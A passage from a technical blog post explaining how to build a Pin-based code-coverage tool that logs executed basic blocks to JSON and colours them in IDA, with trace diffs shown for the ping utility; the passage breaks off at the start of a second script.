    
    <updated>2013-08-31T18:57:00+01:00</updated>
    <id>http://doar-e.github.io/blog/2013/08/31/some-thoughts-about-code-coverage-measurement-with-pin</id>
    
    <content type="html"><![CDATA[<h1>Introduction</h1>

<p>Sometimes, when you are reverse-engineering binaries you need somehow to measure, or just to have an idea about how much &ldquo;that&rdquo; execution is covering the code of your target. It can be for fuzzing purpose, maybe you have a huge set of inputs (it can be files, network traffic, anything) and you want to have the same coverage with only a subset of them. Or maybe, you are not really interested in the measure, but only with the coverage differences between two executions of your target: to locate where your program is handling a specific feature for example.</p>

<p>But it&rsquo;s not a trivial problem, usually you don&rsquo;t have the source-code of the target, and you want it to be quick. The other thing, is that you don&rsquo;t have an input that covers the whole code base, you don&rsquo;t even know if it&rsquo;s possible ; so you can&rsquo;t compare your analysis to that &ldquo;ideal one&rdquo;. Long story short, you can&rsquo;t say to the user &ldquo;OK, this input covers 10% of your binary&rdquo;. But you can clearly register what your program is doing with input A, what it is doing with input B and then analyzing the differences. With that way you can have a (more precise?) idea about which input seems to have better coverage than another.</p>

<p>Note also, this is a perfect occasion to play with Pin :&ndash;)).</p>

<p>In this post, I will explain briefly how you can build that kind of tool using Pin, and how it can be used for reverse-engineer purposes.</p>

<!--more-->


<h1>Our Pintool</h1>

<p>If you have never heard about Intel&rsquo;s DBI framework Pin, I have made a selection of links for you, read them and understand them ; you won&rsquo;t be able of using correctly Pin, if you don&rsquo;t know a bit how it works:</p>

<ul>
<li><a href="http://software.intel.com/sites/landingpage/pintool/docs/58423/Pin/html/index.html">Pin 2.12 User Guide</a></li>
<li><a href="http://www.jaleels.org/ajaleel/Pin/slides/">Introduction to Pin &ndash; Aamer Jaleel</a></li>
</ul>


<p>Concerning my setup, I&rsquo;m using Pin 2.12 on Windows 7 x64 with VC2010 and I&rsquo;m building x86 Pintools (works great with Wow64). If you want to build easily your Pintool outside of the Pin tool kit directory I&rsquo;ve made a handy little python script: <a href="https://github.com/0vercl0k/stuffz/blob/master/setup_pintool_project.py">setup_pintool_project.py</a>.</p>

<p>Before coding, we need to talk a bit about what we really want. This is simple, we want a Pintool that:</p>

<ul>
<li>is the more efficient possible. OK, that&rsquo;s a real problem ; even if Pin is more efficient than other DBI framework (like <a href="http://dynamorio.org/">DynamoRio</a> or <a href="http://valgrind.org/">Valgrind</a>), it is always kind of slow.</li>
<li>keeps track of all the basic blocks executed. We will store the address of each basic block executed and its number of instructions.</li>
<li>generates a JSON report about a specific execution. Once we have that report, we are free to use Python scripts to do whatever we want. To do that, we will use <a href="http://www.digip.org/jansson/">Jansson</a>: it&rsquo;s easy to use, open-source and written in C.</li>
<li>doesn&rsquo;t instrument Windows APIs. We don&rsquo;t want to waste our CPU time being in the native libraries of the system ; it&rsquo;s part of our little &ldquo;tricks&rdquo; to improve the speed of our Pintool.</li>
</ul>


<p>I think it&rsquo;s time to code now: first, let&rsquo;s define several data structures in order to store the information we need:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="k">typedef</span> <span class="n">std</span><span class="o">::</span><span class="n">map</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="n">ADDRINT</span><span class="p">,</span> <span class="n">ADDRINT</span><span class="o">&gt;</span> <span class="o">&gt;</span> <span class="n">MODULE_BLACKLIST_T</span><span class="p">;</span>
</span><span class='line'><span class="k">typedef</span> <span class="n">MODULE_BLACKLIST_T</span> <span class="n">MODULE_LIST_T</span><span class="p">;</span>
</span><span class='line'><span class="k">typedef</span> <span class="n">std</span><span class="o">::</span><span class="n">map</span><span class="o">&lt;</span><span class="n">ADDRINT</span><span class="p">,</span> <span class="n">UINT32</span><span class="o">&gt;</span> <span class="n">BASIC_BLOCKS_INFO_T</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>The two first types will be used to hold modules related information: path of the module, start address and end address. The third one is simple: the key is the basic block address and the value is its number of instructions.</p>

<p>Then we are going to define our instrumentation callback:</p>

<ul>
<li>one to know whenever a module is loaded in order to store its base/end address, one for the traces. You can set the callbacks using <em>IMG_AddInstrumentationFunction</em> and <em>TRACE_AddInstrumentationFunction</em>.</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">VOID</span> <span class="n">image_instrumentation</span><span class="p">(</span><span class="n">IMG</span> <span class="n">img</span><span class="p">,</span> <span class="n">VOID</span> <span class="o">*</span> <span class="n">v</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">ADDRINT</span> <span class="n">module_low_limit</span> <span class="o">=</span> <span class="n">IMG_LowAddress</span><span class="p">(</span><span class="n">img</span><span class="p">),</span> <span class="n">module_high_limit</span> <span class="o">=</span> <span class="n">IMG_HighAddress</span><span class="p">(</span><span class="n">img</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">IMG_IsMainExecutable</span><span class="p">(</span><span class="n">img</span><span class="p">))</span>
</span><span class='line'>        <span class="k">return</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">string</span> <span class="n">image_path</span> <span class="o">=</span> <span class="n">IMG_Name</span><span class="p">(</span><span class="n">img</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">,</span> <span class="n">std</span><span class="o">::</span><span class="n">pair</span><span class="o">&lt;</span><span class="n">ADDRINT</span><span class="p">,</span> <span class="n">ADDRINT</span><span class="o">&gt;</span> <span class="o">&gt;</span> <span class="n">module_info</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">make_pair</span><span class="p">(</span>
</span><span class='line'>        <span class="n">image_path</span><span class="p">,</span>
</span><span class='line'>        <span class="n">std</span><span class="o">::</span><span class="n">make_pair</span><span class="p">(</span>
</span><span class='line'>            <span class="n">module_low_limit</span><span class="p">,</span>
</span><span class='line'>            <span class="n">module_high_limit</span>
</span><span class='line'>        <span class="p">)</span>
</span><span class='line'>    <span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">module_list</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="n">module_info</span><span class="p">);</span>
</span><span class='line'>    <span class="n">module_counter</span><span class="o">++</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">is_module_should_be_blacklisted</span><span class="p">(</span><span class="n">image_path</span><span class="p">))</span>
</span><span class='line'>        <span class="n">modules_blacklisted</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span><span class="n">module_info</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<ul>
<li>one to be able to insert calls before every basic blocks.</li>
</ul>


<p>The thing is: Pin doesn&rsquo;t have a <em>BBL_AddInstrumentationFunction</em>, so we have to instrument the traces, iterate through them to get the basic block. It&rsquo;s done really easily with <em>TRACE_BblHead</em>, <em>BBL_Valid</em> and <em>BBL_Next</em> functions. Of course, if the basic block address is in a blacklisted range address, we don&rsquo;t insert a call to our analysis function.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">VOID</span> <span class="n">trace_instrumentation</span><span class="p">(</span><span class="n">TRACE</span> <span class="n">trace</span><span class="p">,</span> <span class="n">VOID</span> <span class="o">*</span><span class="n">v</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="n">BBL</span> <span class="n">bbl</span> <span class="o">=</span> <span class="n">TRACE_BblHead</span><span class="p">(</span><span class="n">trace</span><span class="p">);</span> <span class="n">BBL_Valid</span><span class="p">(</span><span class="n">bbl</span><span class="p">);</span> <span class="n">bbl</span> <span class="o">=</span> <span class="n">BBL_Next</span><span class="p">(</span><span class="n">bbl</span><span class="p">))</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="n">is_address_in_blacklisted_modules</span><span class="p">(</span><span class="n">BBL_Address</span><span class="p">(</span><span class="n">bbl</span><span class="p">)))</span>
</span><span class='line'>            <span class="k">continue</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">BBL_InsertCall</span><span class="p">(</span>
</span><span class='line'>            <span class="n">bbl</span><span class="p">,</span>
</span><span class='line'>            <span class="n">IPOINT_ANYWHERE</span><span class="p">,</span>
</span><span class='line'>            <span class="p">(</span><span class="n">AFUNPTR</span><span class="p">)</span><span class="n">handle_basic_block</span><span class="p">,</span>
</span><span class='line'>            <span class="n">IARG_FAST_ANALYSIS_CALL</span><span class="p">,</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">IARG_UINT32</span><span class="p">,</span>
</span><span class='line'>            <span class="n">BBL_NumIns</span><span class="p">(</span><span class="n">bbl</span><span class="p">),</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">IARG_ADDRINT</span><span class="p">,</span>
</span><span class='line'>            <span class="n">BBL_Address</span><span class="p">(</span><span class="n">bbl</span><span class="p">),</span>
</span><span class='line'>
</span><span class='line'>            <span class="n">IARG_END</span>
</span><span class='line'>        <span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>For efficiency reasons, we let decide Pin about where it puts its JITed call to the analysis function <em>handle_basic_block</em> ; we also use the fast linkage (it basically means the function will be called using the <a href="http://msdn.microsoft.com/en-us/library/6xa169sk.aspx">__fastcall</a> calling convention).</p>

<p>The analysis function is also very trivial, we just need to store basic block addresses in a global variable. The method doesn&rsquo;t have any branch, it means Pin will most likely inlining the function, that&rsquo;s also cool for the efficiency.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">VOID</span> <span class="n">PIN_FAST_ANALYSIS_CALL</span> <span class="n">handle_basic_block</span><span class="p">(</span><span class="n">UINT32</span> <span class="n">number_instruction_in_bb</span><span class="p">,</span> <span class="n">ADDRINT</span> <span class="n">address_bb</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="n">basic_blocks_info</span><span class="p">[</span><span class="n">address_bb</span><span class="p">]</span> <span class="o">=</span> <span class="n">number_instruction_in_bb</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Finally, just before the process ends we serialize our data in a simple JSON report thanks to <a href="http://www.digip.org/jansson/">jansson</a>. You may also want to use a binary serialization to have smaller report.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">VOID</span> <span class="n">save_instrumentation_infos</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="c1">/// basic_blocks_info section</span>
</span><span class='line'>    <span class="n">json_t</span> <span class="o">*</span><span class="n">bbls_info</span> <span class="o">=</span> <span class="n">json_object</span><span class="p">();</span>
</span><span class='line'>    <span class="n">json_t</span> <span class="o">*</span><span class="n">bbls_list</span> <span class="o">=</span> <span class="n">json_array</span><span class="p">();</span>
</span><span class='line'>    <span class="n">json_t</span> <span class="o">*</span><span class="n">bbl_info</span> <span class="o">=</span> <span class="n">json_object</span><span class="p">();</span>
</span><span class='line'>    <span class="c1">// unique_count field</span>
</span><span class='line'>    <span class="n">json_object_set_new</span><span class="p">(</span><span class="n">bbls_info</span><span class="p">,</span> <span class="s">&quot;unique_count&quot;</span><span class="p">,</span> <span class="n">json_integer</span><span class="p">(</span><span class="n">basic_blocks_info</span><span class="p">.</span><span class="n">size</span><span class="p">()));</span>
</span><span class='line'>    <span class="c1">// list field</span>
</span><span class='line'>    <span class="n">json_object_set_new</span><span class="p">(</span><span class="n">bbls_info</span><span class="p">,</span> <span class="s">&quot;list&quot;</span><span class="p">,</span> <span class="n">bbls_list</span><span class="p">);</span>
</span><span class='line'>    <span class="k">for</span><span class="p">(</span><span class="n">BASIC_BLOCKS_INFO_T</span><span class="o">::</span><span class="n">const_iterator</span> <span class="n">it</span> <span class="o">=</span> <span class="n">basic_blocks_info</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span> <span class="n">it</span> <span class="o">!=</span> <span class="n">basic_blocks_info</span><span class="p">.</span><span class="n">end</span><span class="p">();</span> <span class="o">++</span><span class="n">it</span><span class="p">)</span>
</span><span class='line'>    <span class="p">{</span>
</span><span class='line'>        <span class="n">bbl_info</span> <span class="o">=</span> <span class="n">json_object</span><span class="p">();</span>
</span><span class='line'>        <span class="n">json_object_set_new</span><span class="p">(</span><span class="n">bbl_info</span><span class="p">,</span> <span class="s">&quot;address&quot;</span><span class="p">,</span> <span class="n">json_integer</span><span class="p">(</span><span class="n">it</span><span class="o">-&gt;</span><span class="n">first</span><span class="p">));</span>
</span><span class='line'>        <span class="n">json_object_set_new</span><span class="p">(</span><span class="n">bbl_info</span><span class="p">,</span> <span class="s">&quot;nbins&quot;</span><span class="p">,</span> <span class="n">json_integer</span><span class="p">(</span><span class="n">it</span><span class="o">-&gt;</span><span class="n">second</span><span class="p">));</span>
</span><span class='line'>        <span class="n">json_array_append_new</span><span class="p">(</span><span class="n">bbls_list</span><span class="p">,</span> <span class="n">bbl_info</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="cm">/* .. same thing for blacklisted modules, and modules .. */</span>
</span><span class='line'>    <span class="c1">/// Building the tree</span>
</span><span class='line'>    <span class="n">json_t</span> <span class="o">*</span><span class="n">root</span> <span class="o">=</span> <span class="n">json_object</span><span class="p">();</span>
</span><span class='line'>    <span class="n">json_object_set_new</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="s">&quot;basic_blocks_info&quot;</span><span class="p">,</span> <span class="n">bbls_info</span><span class="p">);</span>
</span><span class='line'>    <span class="n">json_object_set_new</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="s">&quot;blacklisted_modules&quot;</span><span class="p">,</span> <span class="n">blacklisted_modules</span><span class="p">);</span>
</span><span class='line'>    <span class="n">json_object_set_new</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="s">&quot;modules&quot;</span><span class="p">,</span> <span class="n">modules</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="c1">/// Writing the report</span>
</span><span class='line'>    <span class="n">FILE</span><span class="o">*</span> <span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">KnobOutputPath</span><span class="p">.</span><span class="n">Value</span><span class="p">().</span><span class="n">c_str</span><span class="p">(),</span> <span class="s">&quot;w&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">json_dumpf</span><span class="p">(</span><span class="n">root</span><span class="p">,</span> <span class="n">f</span><span class="p">,</span> <span class="n">JSON_COMPACT</span> <span class="o">|</span> <span class="n">JSON_ENSURE_ASCII</span><span class="p">);</span>
</span><span class='line'>    <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>If like me you are on a x64 Windows system, but you are instrumenting x86 processes you should directly blacklist the area where Windows keeps the <a href="http://www.nynaeve.net/?p=131">SystemCallStub</a> (you know the &ldquo;JMP FAR&rdquo;). To do that, we simply use the <em>__readfsdword</em> intrinsic in order to read the field <a href="http://msdn.moonsols.com/win7rtm_x64/TEB32.html">TEB32.WOW32Reserved</a> that holds the address of that stub. Like that you won&rsquo;t waste your CPU time every time your program is performing a system call.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='cpp'><span class='line'><span class="n">ADDRINT</span> <span class="n">wow64stub</span> <span class="o">=</span> <span class="n">__readfsdword</span><span class="p">(</span><span class="mh">0xC0</span><span class="p">);</span>
</span><span class='line'><span class="n">modules_blacklisted</span><span class="p">.</span><span class="n">insert</span><span class="p">(</span>
</span><span class='line'>    <span class="n">std</span><span class="o">::</span><span class="n">make_pair</span><span class="p">(</span>
</span><span class='line'>        <span class="n">std</span><span class="o">::</span><span class="n">string</span><span class="p">(</span><span class="s">&quot;wow64stub&quot;</span><span class="p">),</span>
</span><span class='line'>        <span class="n">std</span><span class="o">::</span><span class="n">make_pair</span><span class="p">(</span>
</span><span class='line'>            <span class="n">wow64stub</span><span class="p">,</span>
</span><span class='line'>            <span class="n">wow64stub</span>
</span><span class='line'>        <span class="p">)</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>The entire Pintool source code is here: <a href="https://github.com/0vercl0k/stuffz/blob/master/pin-code-coverage-measure/pin-code-coverage-measure.cpp">pin-code-coverage-measure.cpp</a>.</p>

<h1>I want to see the results.</h1>

<p>I agree that&rsquo;s neat to have a JSON report with the basic blocks executed by our program, but it&rsquo;s not really readable for a human. We can use an <a href="">IDAPython</a> script that will parse our report, and will color all the instructions executed. It should be considerably better to see the execution path used by your program.</p>

<p>To color an instruction you have to use the functions: <em>idaapi.set_item_color</em> and <em>idaapi.del_item_color</em> (if you want to reset the color). You can also use <em>idc.GetItemSize</em> to know the size of an instruction, like that you can iterate for a specific number of instruction (remember, we stored that in our JSON report!).</p>

<figure class='code'><figcaption><span>idapy_color_path_from_json.py</span><a href='https://github.com/0vercl0k/stuffz/blob/master/pin-code-coverage-measure/idapy_color_path_from_json.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">json</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">idc</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">idaapi</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">color</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">nbins</span><span class="p">,</span> <span class="n">c</span><span class="p">):</span>
</span><span class='line'>    <span class="sd">&#39;&#39;&#39;Color &#39;nbins&#39; instructions starting from ea&#39;&#39;&#39;</span>
</span><span class='line'>    <span class="n">colors</span> <span class="o">=</span> <span class="n">defaultdict</span><span class="p">(</span><span class="nb">int</span><span class="p">,</span> <span class="p">{</span>
</span><span class='line'>            <span class="s">&#39;black&#39;</span> <span class="p">:</span> <span class="mh">0x000000</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;red&#39;</span> <span class="p">:</span> <span class="mh">0x0000FF</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;blue&#39;</span> <span class="p">:</span> <span class="mh">0xFF0000</span><span class="p">,</span>
</span><span class='line'>            <span class="s">&#39;green&#39;</span> <span class="p">:</span> <span class="mh">0x00FF00</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">)</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">nbins</span><span class="p">):</span>
</span><span class='line'>        <span class="n">idaapi</span><span class="o">.</span><span class="n">del_item_color</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span>
</span><span class='line'>        <span class="n">idaapi</span><span class="o">.</span><span class="n">set_item_color</span><span class="p">(</span><span class="n">ea</span><span class="p">,</span> <span class="n">colors</span><span class="p">[</span><span class="n">c</span><span class="p">])</span>
</span><span class='line'>        <span class="n">ea</span> <span class="o">+=</span> <span class="n">idc</span><span class="o">.</span><span class="n">ItemSize</span><span class="p">(</span><span class="n">ea</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span><span class='line'>    <span class="n">f</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="n">idc</span><span class="o">.</span><span class="n">AskFile</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">&#39;*.json&#39;</span><span class="p">,</span> <span class="s">&#39;Where is the JSON report you want to load ?&#39;</span><span class="p">),</span> <span class="s">&#39;r&#39;</span><span class="p">)</span>
</span><span class='line'>    <span class="n">c</span> <span class="o">=</span> <span class="n">idc</span><span class="o">.</span><span class="n">AskStr</span><span class="p">(</span><span class="s">&#39;black&#39;</span><span class="p">,</span> <span class="s">&#39;Which color do you want ?&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span>
</span><span class='line'>    <span class="n">report</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">load</span><span class="p">(</span><span class="n">f</span><span class="p">)</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">report</span><span class="p">[</span><span class="s">&#39;basic_blocks_info&#39;</span><span class="p">][</span><span class="s">&#39;list&#39;</span><span class="p">]:</span>
</span><span class='line'>        <span class="k">print</span> <span class="s">&#39;</span><span class="si">%x</span><span class="s">&#39;</span> <span class="o">%</span> <span class="n">i</span><span class="p">[</span><span class="s">&#39;address&#39;</span><span class="p">],</span>
</span><span class='line'>        <span class="k">try</span><span class="p">:</span>
</span><span class='line'>            <span class="n">color</span><span class="p">(</span><span class="n">i</span><span class="p">[</span><span class="s">&#39;address&#39;</span><span class="p">],</span> <span class="n">i</span><span class="p">[</span><span class="s">&#39;nbins&#39;</span><span class="p">],</span> <span class="n">c</span><span class="p">)</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;ok&#39;</span>
</span><span class='line'>        <span class="k">except</span> <span class="ne">Exception</span><span class="p">,</span> <span class="n">e</span><span class="p">:</span>
</span><span class='line'>            <span class="k">print</span> <span class="s">&#39;fail: </span><span class="si">%s</span><span class="s">&#39;</span> <span class="o">%</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
</span><span class='line'>    <span class="k">print</span> <span class="s">&#39;done&#39;</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">1</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">&#39;__main__&#39;</span><span class="p">:</span>
</span><span class='line'>    <span class="n">main</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here is an example generated by launching &ldquo;ping google.fr&rdquo;, we can clearly see in black the nodes reached by the ping utility:</p>

<p><img class="center" src="http://doar-e.github.io/images/some_thoughts_about_code-coverage_measurement_with_pin/ping.png"></p>

<p>You can even start to generate several traces with different options, to see where each argument is handled and analyzed by the program :&ndash;).</p>

<h1>Trace differences</h1>

<p>As you saw previously, it can be handy to actually see the execution path our program took. But if you think about it, it can be even more handy to have a look at the differences between two different executions. It could be used to locate a specific feature of a program: like a license check, where an option is checked, etc.</p>

<p>Now, let&rsquo;s run another trace with for example &ldquo;ping -n 10 google.fr&rdquo;. Here are the two executions traces and the difference between the two others (the previous one, and the new):</p>

<p><img class="center" src="http://doar-e.github.io/images/some_thoughts_about_code-coverage_measurement_with_pin/pingboth.png"></p>

<p>You can clearly identify the basic blocks and the functions that use the &ldquo;-n 10&rdquo; argument.
If you look even closer, you are able very quickly to figure out where the string is converted into an integer:</p>

<p><img class="center" src="http://doar-e.github.io/images/some_thoughts_about_code-coverage_measurement_with_pin/strtoul.png"></p>

<p>A lot of software are built around a really annoying GUI (for the reverser at least): it usually generates big binaries, or ships with a lot of external modules (like Qt runtime libraries). The thing is you don&rsquo;t really care about how the GUI is working, you want to focus on the &ldquo;real&rdquo; code not on that &ldquo;noise&rdquo;. Each time you have noise somewhere, you have to figure out a way to filter that noise ; in order to only keep the interesting part. This is exactly what we are doing when we generate different execution traces of the program and the process is every time pretty the same:</p>

<ul>
<li>You launch the application, and you exit</li>
<li>You launch the application, you do something and you exit</li>
<li>You remove the basic blocks executed in the first run in the second trace ; in order to keep only the part that does the &ldquo;do something&rdquo; thing. That way you filter the noise induced by the GUI to focus only on the interesting part.</li>
</ul>


<p>Cool for us because that&rsquo;s pretty easy to implement via IDAPython, here is the script:</p>

<figure class='code'><figcaption><span>idapy_color_diff_from_jsons.py</span><a href='https://github.com/0vercl0k/stuffz/blob/master/pin-code-coverage-measure/idapy_color_diff_from_jsons.py'>link</a></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
